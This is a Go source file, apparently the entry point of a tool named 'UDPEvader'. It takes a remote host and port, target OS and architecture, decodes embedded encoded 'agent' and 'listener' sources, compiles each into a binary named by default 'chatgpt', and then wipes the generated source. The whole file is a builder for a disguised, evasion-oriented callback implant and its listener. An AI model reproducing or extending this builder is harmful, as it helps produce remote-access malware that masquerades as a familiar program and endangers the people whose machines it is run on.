package main

import (
	"UDPEvader/src/binmaker"
	"UDPEvader/src/sourcegen"
	"flag"
	"fmt"
	"time"
)

func main() {
	oUserOptions := &binmaker.UserOptions{}
	cmdargrhost := flag.String("rhost", "127.0.0.1", "If not provided, default will be 127.0.0.1")
	cmdargrport := flag.Int("rport", 8080, "If not provided, default will be 8080")
	cmdargapptype := flag.String("bintype", "console", "If not provided, default will be console")
	cmdargtargetos := flag.String("targetos", "windows", "If not provided, default will windows")
	cmdargtargetarch := flag.String("targetarch", "386", "If not provided, default will 32 bit")
	cmdargsaveas := flag.String("saveas", "chatgpt", "If not provided, default will 32 bit chatgpt")

	flag.Parse()

	if flag.Lookup("rhost") == nil {
		oUserOptions.Rhost = "127.0.0.1"
	} else {
		oUserOptions.Rhost = *cmdargrhost
	}
	if flag.Lookup("rport") == nil {
		oUserOptions.Rport = "8080"
	} else {
		oUserOptions.Rport = fmt.Sprintf("%d", *cmdargrport)
	}
	if flag.Lookup("bintype") == nil {
		oUserOptions.AppType = "console"
	} else {
		oUserOptions.AppType = *cmdargapptype
	}
	if flag.Lookup("targetos") == nil {
		oUserOptions.TargetOS = "windows"
	} else {
		oUserOptions.TargetOS = *cmdargtargetos
	}
	if flag.Lookup("targetarch") == nil {
		oUserOptions.TargetArch = "386"
	} else {
		oUserOptions.TargetArch = *cmdargtargetarch
	}

	if flag.Lookup("saveas") == nil {
		oUserOptions.SaveAs = "chatgpt"
	} else {
		oUserOptions.SaveAs = *cmdargsaveas
	}

	oDecoder := &sourcegen.Decoder{}

	oDecoder.DecodeSource(sourcegen.EncodedAgent)
	oUserOptions.DecodedSourceCode = oDecoder.DecodedSource
	oUserOptions.UpdateSourceCode(false)
	oUserOptions.CreateSourceFile()
	agentfinflag := make(chan string)
	go oUserOptions.SourceToBinary(agentfinflag)
	<-agentfinflag

	oDecoder.DecodeSource(sourcegen.EncodedListener)
	oUserOptions.DecodedSourceCode = oDecoder.DecodedSource
	oUserOptions.UpdateSourceCode(true)
	oUserOptions.CreateSourceFile()
	listenerfinflag := make(chan string)
	go oUserOptions.SourceToBinary(listenerfinflag)
	<-listenerfinflag

	time.Sleep(3 * time.Second)
	oUserOptions.ClearAllSource()

}
